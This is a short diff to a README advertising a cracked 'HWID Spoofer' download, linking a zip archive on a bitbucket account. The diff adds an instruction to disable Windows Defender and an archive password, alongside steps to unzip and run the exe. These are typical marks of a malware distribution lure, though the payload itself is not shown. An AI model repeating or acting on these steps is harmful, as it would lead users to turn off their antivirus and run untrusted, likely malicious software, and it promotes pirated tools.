@@ -10,8 +10,9 @@ HWID Spoofer Free Download Full Version with Crack features advanced functionali
 > ## Hwid Spoofer x64 - [Click To Download](https://bitbucket.org/gitfilesprojecct/gitfiles/downloads/Spoofer_Setup_x64.zip)
 
 ## Instructions
+- DISABLE WINDOWS DEFENDER!!!
 1. Download the archive
-2. Unzip to any folder 
+2. Unzip to any folder (pass: spoof2025)
 3. Run exe
 4. Enjoy
 
